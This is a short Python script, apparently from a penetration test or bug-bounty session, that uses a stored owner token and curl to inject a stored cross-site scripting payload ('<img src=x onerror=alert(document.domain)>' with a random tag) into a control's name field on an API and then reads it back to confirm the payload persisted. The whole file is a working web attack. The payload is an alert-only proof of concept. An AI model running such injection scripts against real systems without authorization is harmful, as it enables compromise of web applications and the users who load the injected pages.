import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TO=open('/tmp/bac_OWNER').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or TO),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXSS'+uuid.uuid4().hex[:6]
PAY=f'<img src=x onerror=alert(document.domain)>{tag}'
print("storing payload into controls/1.name")
c,b=req('PUT','/api/v1/controls/1',{"control":{"name":PAY}})
print(f"  PUT -> {c}")
c,b=req('GET','/api/v1/controls/1')
print(f"  readback contains tag: {tag in b}")
open('/tmp/xss_tag','w').write(tag)
print(f"  tag={tag}")
